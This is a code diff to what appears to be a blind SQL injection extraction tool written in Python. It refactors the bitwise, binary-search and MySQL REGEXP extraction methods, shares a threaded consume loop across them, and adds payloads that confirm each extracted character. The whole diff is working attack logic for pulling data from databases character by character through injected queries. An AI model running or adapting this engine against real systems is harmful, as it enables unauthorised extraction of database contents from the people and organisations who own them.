@@ -274,6 +274,8 @@ class Method_Base(object):
     else:
       if stop_index == -1:
         c, q = query
+
+        logger.debug('query: %s' % c)
         count = ''.join(self.get_row(c))
 
         logger.info('count: %s' % count)
@@ -312,7 +314,7 @@ class Method_error(Method_Inband):
 
 class Method_Blind(Method_Base):
 
-  def __init__(self, make_requester, template, num_threads=7, rate_limit=0, confirm_char=False):
+  def __init__(self, make_requester, template, num_threads=7, rate_limit=0, confirm_char=True):
     super(Method_Blind, self).__init__(make_requester, template)
 
     self.num_threads = num_threads
@@ -336,9 +338,6 @@ class Method_Blind(Method_Base):
   def get_row(self, query, row_pos):
     pass
 
-class Method_bitwise(Method_Blind):
-  '''Bit ANDing'''
-
   def get_state(self):
     while True:
       try:
@@ -346,9 +345,34 @@ class Method_bitwise(Method_Blind):
       except Empty:
         sleep(.1)
 
-  def get_row(self, query, row_pos=0):
-    logger.debug('query: %s' % query)
+  def consume(self):
+    requester = self.make_requester()
 
+    while True:
+      task_id, payload = self.taskq.get()
+      try_count = 0
+
+      while True:
+        try_count += 1
+
+        try:
+          state = requester.test(payload)
+          self.resultq.put((task_id, state))
+          break
+
+        except:
+          mesg = '%s %s' % sys.exc_info()[:2]
+          logger.warn('try %d, caught: %s' % (try_count, mesg))
+          logger.exception(sys.exc_info()[1])
+
+          sleep(try_count * 2)
+          requester = self.make_requester()
+          continue
+
+class Method_bitwise(Method_Blind):
+  '''Bit ANDing'''
+
+  def get_row(self, query, row_pos=0):
     result = ''
     char_pos = 1
 
@@ -364,7 +388,7 @@ class Method_bitwise(Method_Blind):
         bit_pos, state = self.get_state()
         char |= state << bit_pos
 
-      logger.debug('char: %d (%r)' % (char, chr(char)))
+      logger.debug('char: %r (%d)' % (chr(char), char))
 
       if char >= 127:
         continue
@@ -394,36 +418,10 @@ class Method_bitwise(Method_Blind):
     logger.debug('row %d: %s' % (row_pos, result))
     return result
 
-  def consume(self):
-    requester = self.make_requester()
-
-    while True:
-      task_id, payload = self.taskq.get()
-      try_count = 0
-
-      while True:
-        try_count += 1
-
-        try:
-          state = requester.test(payload)
-          self.resultq.put((task_id, state))
-          break
-
-        except:
-          mesg = '%s %s' % sys.exc_info()[:2]
-          logger.warn('try %d, caught: %s' % (try_count, mesg))
-          logger.exception(sys.exc_info()[1])
-
-          sleep(try_count * 2)
-          requester = self.make_requester()
-          continue
-
-class Method_binary(Method_bitwise):
+class Method_binary(Method_Blind):
   '''Binary Search'''
 
   def get_row(self, query, row_pos=0):
-    logger.debug('query: %s' % query)
-
     result = ''
     char_pos = 1
     charset = [chr(i) for i in range(127)]
@@ -436,7 +434,7 @@ class Method_binary(Method_bitwise):
       while lo <= hi:
         mid = (lo + hi) / 2
 
-        payload = make_payload(self.template, ('query', query), ('char_pos', char_pos), ('char_ord', ord(charset[mid])), ('row_pos', row_pos))
+        payload = make_payload(self.template, ('query', query), ('row_pos', row_pos), ('char_pos', char_pos), ('comparator', '>'), ('char_ord', ord(charset[mid])))
         self.taskq.put_nowait((0, payload))
 
         _, state = self.get_state()
@@ -447,7 +445,17 @@ class Method_binary(Method_bitwise):
           hi = mid - 1
 
       char = charset[lo]
-      logger.debug('char: %d (%r)' % (ord(char), char))
+      logger.debug('char: %r (%d)' % (char, ord(char)))
+
+      if self.confirm_char:
+        payload = make_payload(self.template, ('query', query), ('row_pos', row_pos), ('char_pos', char_pos), ('comparator', '='), ('char_ord', ord(char)))
+        self.taskq.put_nowait((0, payload))
+
+        _, state = self.get_state()
+        if not state:
+          requester = self.make_requester()
+          logger.debug('could not confirm char')
+          continue
 
       if char == charset[0]:
         break
@@ -464,11 +472,10 @@ class Method_binary(Method_bitwise):
     logger.debug('row %d: %s' % (row_pos, result))
     return result
 
-class Method_regexp(Method_bitwise):
+class Method_regexp(Method_Blind):
   '''MySQL REGEXP'''
 
   def get_row(self, query, row_pos=0):
-
     result = ''
 
     while True:
@@ -507,7 +514,18 @@ class Method_regexp(Method_bitwise):
         prev_state = state
 
       char = s[0]
-      logger.debug('char: %d (%r)' % (ord(char), char))
+      logger.debug('char: %r (%d)' % (char, ord(char)))
+
+      if self.confirm_char:
+        regexp = '0x%s' % ('^%s%s' % (result, char)).encode('hex')
+        payload = make_payload(self.template, ('query', query), ('regexp', regexp), ('row_pos', row_pos))
+        self.taskq.put_nowait((0, payload))
+
+        _, state = self.get_state()
+        if not state:
+          requester = self.make_requester()
+          logger.debug('could not confirm char')
+          continue
 
       if char == '\xff':
         break
